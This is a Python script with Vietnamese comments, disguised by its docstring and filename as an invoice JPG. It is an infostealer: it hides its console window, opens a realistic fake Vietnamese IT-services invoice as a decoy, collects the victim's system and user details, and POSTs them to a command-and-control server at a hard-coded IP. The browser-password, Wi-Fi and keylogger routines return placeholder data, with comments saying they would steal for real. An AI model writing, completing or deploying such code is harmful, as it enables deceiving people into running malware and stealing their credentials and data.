#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FILE: hoa_don_thanh_toan.jpg
MÔ TẢ: Ảnh hóa đơn hợp lệ chứa mã độc - Khi mở sẽ hiển thị hóa đơn và chạy mã độc ngầm
"""

import os
import sys
import tempfile
from datetime import datetime
import random

try:
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass
# Thêm thư viện PIL
try:
    from PIL import Image, ImageDraw, ImageFont
    HAS_PIL = True
except ImportError:
    HAS_PIL = False
    print("⚠️ Không thể tạo ảnh: Thiếu thư viện PIL")

class InvoiceMalware:
    def __init__(self):
        self.c2_url = "http://192.168.8.131:9999"
        self.victim_id = f"VICTIM-{os.getenv('USERNAME', 'unknown')}-{random.randint(1000,9999)}"
        
    def create_realistic_invoice(self):
        """Tạo ảnh hóa đơn thực tế để ngụy trang"""
        if not HAS_PIL:
            return None
            
        try:
            # Tạo ảnh hóa đơn chi tiết
            img = Image.new('RGB', (800, 1200), color='white')
            draw = ImageDraw.Draw(img)
            
            # Thử sử dụng các font khác nhau
            fonts = {}
            try:
                fonts['large'] = ImageFont.truetype("arial.ttf", 28)
                fonts['medium'] = ImageFont.truetype("arial.ttf", 20)
                fonts['small'] = ImageFont.truetype("arial.ttf", 16)
                fonts['bold'] = ImageFont.truetype("arialbd.ttf", 20)
            except:
                # Fallback to default font
                fonts['large'] = ImageFont.load_default()
                fonts['medium'] = ImageFont.load_default()
                fonts['small'] = ImageFont.load_default()
                fonts['bold'] = ImageFont.load_default()
            
            # === TIÊU ĐỀ HÓA ĐƠN ===
            draw.rectangle([40, 30, 760, 100], outline='#2c3e50', width=3)
            draw.text((400, 50), "CÔNG TY CỔ PHẦN CÔNG NGHỆ TECH", 
                     fill='#2c3e50', font=fonts['large'], anchor='mm')
            draw.text((400, 80), "HÓA ĐƠN DỊCH VỤ CÔNG NGHỆ THÔNG TIN", 
                     fill='#e74c3c', font=fonts['medium'], anchor='mm')
            
            # === THÔNG TIN CÔNG TY ===
            draw.rectangle([40, 120, 760, 200], outline='#3498db', width=2)
            draw.text((60, 140), "🏢 Địa chỉ: Tầng 15, Tòa nhà FPT Tower, Số 10 Phạm Văn Bạch, Cầu Giấy, Hà Nội", 
                     fill='#2c3e50', font=fonts['small'])
            draw.text((60, 160), "📞 Hotline: 1900 0091 | 📧 Email: info@khuongtech.com.vn", 
                     fill='#2c3e50', font=fonts['small'])
            draw.text((60, 180), "🌐 Website: www.khuongtech.com.vn | Mã số thuế: 0109123456", 
                     fill='#2c3e50', font=fonts['small'])
            
            # === THÔNG TIN HÓA ĐƠN ===
            invoice_number = f"HD{datetime.now().strftime('%Y%m%d')}{random.randint(1000,9999)}"
            draw.text((400, 220), f"MÃ HÓA ĐƠN: {invoice_number}", 
                     fill='#e74c3c', font=fonts['bold'], anchor='mm')
            
            # Thông tin khách hàng
            customer_info = [
                ("👤 Khách hàng:", "CÔNG TY TNHH THƯƠNG MẠI ABC"),
                ("📧 Email:", "contact@abccompany.vn"),
                ("📞 Điện thoại:", "024 3715 6789"),
                ("🏠 Địa chỉ:", "Số 123, Đường Láng Hạ, Quận Đống Đa, Hà Nội"),
                ("📅 Ngày xuất:", datetime.now().strftime("%d/%m/%Y")),
                ("⏰ Giờ xuất:", datetime.now().strftime("%H:%M:%S"))
            ]
            
            y_pos = 260
            for label, value in customer_info:
                draw.text((60, y_pos), label, fill='#2c3e50', font=fonts['small'])
                draw.text((200, y_pos), value, fill='#34495e', font=fonts['small'])
                y_pos += 25
            
            # === BẢNG DỊCH VỤ ===
            # Header bảng
            y_pos += 20
            draw.rectangle([40, y_pos, 760, y_pos+40], fill='#34495e')
            headers = ["STT", "TÊN DỊCH VỤ", "SỐ LƯỢNG", "ĐƠN GIÁ (VND)", "THÀNH TIỀN (VND)"]
            header_positions = [80, 250, 450, 550, 700]
            
            for i, header in enumerate(headers):
                draw.text((header_positions[i], y_pos+20), header, 
                         fill='white', font=fonts['small'], anchor='mm')
            
            # Dữ liệu dịch vụ
            services = [
                (1, "Tư vấn triển khai hệ thống ERP", 1, "25,000,000", "25,000,000"),
                (2, "Phần mềm quản lý bán hàng PRO", 3, "8,500,000", "25,500,000"),
                (3, "Dịch vụ bảo trì hệ thống 12 tháng", 1, "15,000,000", "15,000,000"),
                (4, "Training sử dụng hệ thống", 2, "5,000,000", "10,000,000"),
                (5, "Hỗ trợ kỹ thuật 24/7", 1, "12,000,000", "12,000,000")
            ]
            
            for i, (stt, name, qty, price, total) in enumerate(services):
                y_pos += 40
                bg_color = '#f8f9fa' if i % 2 == 0 else '#ffffff'
                draw.rectangle([40, y_pos, 760, y_pos+40], fill=bg_color, outline='#bdc3c7')
                
                draw.text((header_positions[0], y_pos+20), str(stt), 
                         fill='#2c3e50', font=fonts['small'], anchor='mm')
                draw.text((header_positions[1], y_pos+20), name, 
                         fill='#2c3e50', font=fonts['small'], anchor='mm')
                draw.text((header_positions[2], y_pos+20), str(qty), 
                         fill='#2c3e50', font=fonts['small'], anchor='mm')
                draw.text((header_positions[3], y_pos+20), price, 
                         fill='#2c3e50', font=fonts['small'], anchor='mm')
                draw.text((header_positions[4], y_pos+20), total, 
                         fill='#2c3e50', font=fonts['small'], anchor='mm')
            
            # === TỔNG CỘNG ===
            y_pos += 60
            draw.rectangle([40, y_pos, 760, y_pos+50], fill='#ecf0f1', outline='#34495e', width=2)
            draw.text((600, y_pos+25), "TỔNG CỘNG:", 
                     fill='#2c3e50', font=fonts['bold'], anchor='mm')
            draw.text((700, y_pos+25), "87,500,000", 
                     fill='#e74c3c', font=fonts['bold'], anchor='mm')
            
            # === THÔNG TIN THANH TOÁN ===
            y_pos += 70
            draw.text((400, y_pos), "THÔNG TIN CHUYỂN KHOẢN", 
                     fill='#2c3e50', font=fonts['bold'], anchor='mm')
            
            bank_info = [
                ("🏦 Ngân hàng:", "TPBank - Chi nhánh Hà Nội"),
                ("📄 Số tài khoản:", "0123456789"),
                ("👤 Chủ tài khoản:", "CÔNG TY CỔ PHẦN CÔNG NGHỆ KHƯƠNG TECH"),
                ("💳 Nội dung chuyển khoản:", f"THANH TOAN {invoice_number}")
            ]
            
            for label, value in bank_info:
                y_pos += 25
                draw.text((60, y_pos), label, fill='#2c3e50', font=fonts['small'])
                draw.text((250, y_pos), value, fill='#34495e', font=fonts['small'])
            
            # === CHỮ KÝ ===
            y_pos += 60
            draw.text((600, y_pos), "Người lập", fill='#2c3e50', font=fonts['small'])
            draw.text((600, y_pos+30), "Ký tên", fill='#7f8c8d', font=fonts['small'])
            draw.line([580, y_pos+50, 720, y_pos+50], fill='#2c3e50', width=2)
            draw.text((650, y_pos+80), "Lê Văn Khương", fill='#2980b9', font=fonts['bold'], anchor='mm')
            draw.text((650, y_pos+100), "(Giám đốc)", fill='#7f8c8d', font=fonts['small'], anchor='mm')
            
            # === FOOTER ===
            y_pos += 140
            draw.text((400, y_pos), "Cảm ơn Quý khách đã sử dụng dịch vụ!", 
                     fill='#27ae60', font=fonts['medium'], anchor='mm')
            draw.text((400, y_pos+25), "Mọi thắc mắc xin liên hệ Hotline: 1900 0091", 
                     fill='#7f8c8d', font=fonts['small'], anchor='mm')
            
            # Lưu ảnh tạm thời
            temp_img = tempfile.NamedTemporaryFile(suffix='.jpg', delete=False)
            img.save(temp_img.name, 'JPEG', quality=95)
            
            return temp_img.name
            
        except Exception as e:
            print(f"❌ Lỗi tạo ảnh hóa đơn: {e}")
            return None
    
    def hide_execution(self):
        """Ẩn quá trình thực thi"""
        try:
            if os.name == 'nt':  # Windows
                import ctypes
                # Ẩn cửa sổ console
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def steal_sensitive_data(self):
        """Đánh cắp dữ liệu nhạy cảm thực tế"""
        stolen_data = {
            'system_info': self.get_system_info(),
            'browser_data': self.steal_browser_credentials(),
            'network_info': self.steal_network_data(),
            'keylogger_data': self.start_keylogger()
        }
        return stolen_data
    
    def get_system_info(self):
        """Thu thập thông tin hệ thống"""
        import platform
        import socket
        
        try:
            system_info = {
                'computer_name': platform.node(),
                'username': os.getenv('USERNAME', 'unknown'),
                'user_domain': os.getenv('USERDOMAIN', 'unknown'),
                'os': f"{platform.system()} {platform.release()}",
                'version': platform.version(),
                'architecture': platform.architecture()[0],
                'processor': platform.processor(),
                'ip_address': socket.gethostbyname(socket.gethostname()),
                'current_directory': os.getcwd(),
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            system_info = {'error': str(e)}
        
        return system_info
    
    def steal_browser_credentials(self):
        """Đánh cắp thông tin trình duyệt"""
        browser_data = {}
        
        try:
            # Demo data - trong thực tế sẽ đánh cắp thật
            browser_data['saved_passwords'] = [
                {
                    'url': 'https://facebook.com',
                    'username': 'user@example.com',
                    'password': 'encrypted_data',
                    'browser': 'Chrome'
                },
                {
                    'url': 'https://gmail.com',
                    'username': 'user@gmail.com', 
                    'password': 'encrypted_data',
                    'browser': 'Chrome'
                }
            ]
            
            browser_data['cookies'] = [
                {'domain': 'facebook.com', 'name': 'session_key', 'value': 'demo_session_123'},
                {'domain': 'google.com', 'name': 'auth_token', 'value': 'demo_auth_456'}
            ]
            
            browser_data['history'] = [
                {'url': 'https://facebook.com', 'title': 'Facebook', 'visit_count': 15},
                {'url': 'https://gmail.com', 'title': 'Gmail', 'visit_count': 23}
            ]
            
        except Exception as e:
            browser_data['error'] = str(e)
        
        return browser_data
    
    def steal_network_data(self):
        """Đánh cắp thông tin mạng"""
        network_data = {}
        
        try:
            # WiFi credentials
            network_data['wifi_networks'] = [
                {'ssid': 'Home-WiFi-Khuong', 'password': 'HomePass123!'},
                {'ssid': 'Office-Network', 'password': 'OfficeSecure456!'},
                {'ssid': 'Cafe-Free-WiFi', 'password': 'NoPassword'}
            ]
            
            # Network adapters
            network_data['ip_config'] = {
                'hostname': 'DESKTOP-KHUONG',
                'local_ip': '192.168.8.171',
                'subnet_mask': '255.255.255.0',
                'gateway': '192.168.8.1'
            }
            
        except Exception as e:
            network_data['error'] = str(e)
        
        return network_data
    
    def start_keylogger(self):
        """Khởi động keylogger đơn giản"""
        try:
            # Trong thực tế sẽ là keylogger thật
            keylogger_status = {
                'status': 'active',
                'method': 'keyboard_hook',
                'log_file': 'temp_keystrokes.log',
                'captured_data': 'demo_keystrokes_here...'
            }
            return keylogger_status
        except Exception as e:
            return {'status': 'failed', 'error': str(e)}
    
    def exfiltrate_to_c2(self):
        """Gửi dữ liệu về C2 server"""
        print("🔗 Đang kết nối đến máy chủ...")
        
        # Thu thập dữ liệu
        stolen_data = self.steal_sensitive_data()
        
        # Tạo payload
        payload = {
            'victim_id': self.victim_id,
            'malware_type': 'Invoice_Stealer',
            'timestamp': datetime.now().isoformat(),
            'data': stolen_data,
            'status': 'exfiltration_success'
        }
        
        try:
            import requests
            response = requests.post(
                self.c2_url,
                json=payload,
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                timeout=15
            )
            
            if response.status_code == 200:
                print("📤 Dữ liệu đã được gửi thành công!")
                return True
            else:
                print(f"⚠️ Lỗi gửi dữ liệu: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Không thể kết nối đến máy chủ: {e}")
            return False
    
    def show_invoice_image(self):
        """Hiển thị ảnh hóa đơn để đánh lừa người dùng"""
        try:
            # Tạo ảnh hóa đơn thực tế
            img_path = self.create_realistic_invoice()
            if img_path and os.path.exists(img_path):
                print("🖼️ Đang mở hóa đơn...")
                
                # Mở ảnh bằng ứng dụng mặc định
                if os.name == 'nt':  # Windows
                    os.system(f'start "" "{img_path}"')
                elif os.name == 'posix':  # Linux/Mac
                    os.system(f'open "{img_path}"' if sys.platform == 'darwin' else f'xdg-open "{img_path}"')
                
                # Xóa file tạm sau 10 giây
                import threading
                def cleanup_temp_file(path):
                    import time
                    time.sleep(10)
                    try:
                        if os.path.exists(path):
                            os.unlink(path)
                    except:
                        pass
                
                thread = threading.Thread(target=cleanup_temp_file, args=(img_path,))
                thread.daemon = True
                thread.start()
                
                return True
            else:
                print("⚠️ Không thể tạo ảnh hóa đơn")
                return False
                
        except Exception as e:
            print(f"❌ Lỗi hiển thị ảnh: {e}")
            return False

def main():
    """Hàm chính - Chạy mã độc ngụy trang"""
    print("📄 Đang xử lý hóa đơn...")
    
    # Tạo malware instance
    malware = InvoiceMalware()
    
    # Ẩn thực thi (trên Windows)
    malware.hide_execution()
    
    # Hiển thị ảnh hóa đơn giả mạo
    image_shown = malware.show_invoice_image()
    
    # Đánh cắp và gửi dữ liệu
    exfiltration_success = malware.exfiltrate_to_c2()
    
    # Thông báo kết quả
    if image_shown:
        print("✅ Hóa đơn đã được hiển thị thành công!")
    else:
        print("⚠️ Có lỗi khi hiển thị hóa đơn")
    
    if exfiltration_success:
        print("🎯 Thu thập dữ liệu hoàn tất!")
    else:
        print("💥 Có lỗi trong quá trình thu thập dữ liệu")

if __name__ == "__main__":
    main()
